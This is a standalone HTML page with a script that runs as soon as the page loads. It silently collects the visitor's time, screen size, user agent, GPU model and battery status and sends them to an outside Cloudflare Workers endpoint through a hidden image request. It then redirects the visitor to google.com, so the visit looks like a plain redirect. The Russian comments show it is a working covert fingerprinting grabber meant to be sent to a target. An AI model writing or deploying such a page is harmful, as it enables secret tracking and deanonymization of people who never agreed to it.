<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
    async function rntg() {
        const d = {
            t: new Date().toLocaleString(),
            res: `${screen.width}x${screen.height}`,
            ua: navigator.userAgent
        };

        // Сбор GPU
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            const info = gl.getExtension('WEBGL_debug_renderer_info');
            d.gpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
        } catch (e) { d.gpu = 'n/a'; }

        // Сбор Батареи
        try {
            const b = await navigator.getBattery();
            d.bat = `${Math.round(b.level * 100)}%${b.charging ? '+' : '-'}`;
        } catch (e) { d.bat = 'n/a'; }

        // ПАРАМЕТРЫ ЗАПРОСА
        const q = Object.keys(d).map(k => `${k}=${encodeURIComponent(d[k])}`).join('&');
        
        // Используем твой текущий воркер
        const worker = "https://adminfdm.alexgranny1708.workers.dev/";
        
        const i = new Image();
        const exit = () => window.location.replace("https://google.com");

        i.onload = exit;
        i.onerror = exit;
        i.src = worker + "?" + q;

        // Резервный таймер (если Image заблочен провайдером)
        setTimeout(exit, 2000);
    }
    rntg();
</script>
</body>
</html>
